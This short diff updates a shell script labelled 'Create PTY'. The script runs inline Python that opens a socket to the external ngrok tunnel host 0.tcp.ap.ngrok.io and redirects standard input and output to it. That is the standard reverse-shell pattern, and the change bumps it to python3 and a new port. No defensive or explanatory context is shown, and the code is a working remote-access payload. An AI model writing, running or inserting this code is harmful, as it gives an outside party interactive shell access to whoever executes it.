@@ -1,12 +1,12 @@
 #!/bin/sh
 # Create PTY
-python -c "
+python3 -c "
 import pty
 import os
 import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('0.tcp.ap.ngrok.io', 18743))
+s.connect(('0.tcp.ap.ngrok.io', 10858))
 
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
